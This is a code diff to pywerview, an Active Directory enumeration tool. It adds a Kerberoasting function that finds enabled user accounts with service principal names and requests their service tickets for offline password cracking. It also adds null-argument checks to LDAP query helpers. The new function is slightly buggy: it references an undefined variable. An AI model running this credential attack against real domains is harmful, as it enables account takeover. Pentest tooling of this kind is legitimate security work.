@@ -5,6 +5,7 @@ from impacket.ldap import ldaptypes
 from pywerview.modules.ldapattack import LDAPAttack, ACLEnum, ADUser
 from pywerview.modules.ca import CAEnum
 from pywerview.modules.addcomputer import ADDCOMPUTER
+from pywerview.modules.kerberoast import GetUserSPNs
 from pywerview.utils.helpers import *
 from pywerview.utils.connections import CONNECTION
 
@@ -68,11 +69,12 @@ class PywerView:
         return self.ldap_session.entries
 
     def get_domainobject(self, args=None, properties='*', identity='*'):
-        identity_fiter = f"(|(samAccountName={identity})(name={identity})(displayname={identity})(objectSid={identity})(distinguishedName={identity})(dnshostname={identity}))"
+        identity_filter = f"(|(samAccountName={identity})(name={identity})(displayname={identity})(objectSid={identity})(distinguishedName={identity})(dnshostname={identity}))"
         ldap_filter = f"(|{identity_filter})"
-        if args.ldapfilter:
-            logging.debug(f'[Get-DomainObject] Using additional LDAP filter: {args.ldapfilter}')
-            ldap_filter += f"{args.ldap_filter}"
+        if args:
+            if args.ldapfilter:
+                logging.debug(f'[Get-DomainObject] Using additional LDAP filter: {args.ldapfilter}')
+                ldap_filter += f"{args.ldap_filter}"
         ldap_fiter = f"(&{ldap_filter})"
         logging.debug(f'LDAP search filter: {ldap_filter}')
         self.ldap_session.search(self.root_dn,ldap_filter,attributes=properties)
@@ -80,11 +82,12 @@ class PywerView:
 
     def get_domainou(self, args=None, properties='*', identity='*'):
         ldap_filter = ""
-        if args.gplink:
-            ldap_filter += f"(gplink=*{args.gplink}*)"
-        if args.ldapfilter:
-            logging.debug(f'[Get-DomainOU] Using additional LDAP filter: {args.ldapfilter}')
-            ldap_filter += f"{args.ldapfilter}"
+        if args:
+            if args.gplink:
+                ldap_filter += f"(gplink=*{args.gplink}*)"
+            if args.ldapfilter:
+                logging.debug(f'[Get-DomainOU] Using additional LDAP filter: {args.ldapfilter}')
+                ldap_filter += f"{args.ldapfilter}"
 
         ldap_filter = f'(&(objectCategory=organizationalUnit)(|(name={identity})){ldap_filter})'
         logging.debug(f'LDAP search filter: {ldap_filter}')
@@ -507,6 +510,26 @@ class PywerView:
             logging.info('Success! modified attribute for target object')
 
         return succeeded
+
+    def invoke_kerberoast(self, args):
+        # look for users with SPN set
+        ldap_filter = ""
+        ldap_filter = f"(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!(objectCategory=computer))"
+        if args.identity:
+            ldap_filter = f"(sAMAccountName={identity})"
+        ldap_filter = f"(&{ldap_filter})"
+        logging.debug(f'[Invoke-Kerberoast] LDAP Filter string: {ldap_filter}')
+        self.ldap_session.search(self.root_dn, ldap_filter, attributes=['servicePrincipalName', 'sAMAccountName','pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'])
+        entries = self.ldap_session.entries
+        # request TGS for each accounts
+        target_domain = self.domain
+        if args.server:
+            target_domain = args.server
+        userspn = GetUserSPNs(self.username, self.password, self.domain, target_domain, self.args, identity=args.identity)
+        userspn.run(entries)
+
+        # properly formatted for output
+        return False
 
     def get_shares(self, args):
         if args.computer:
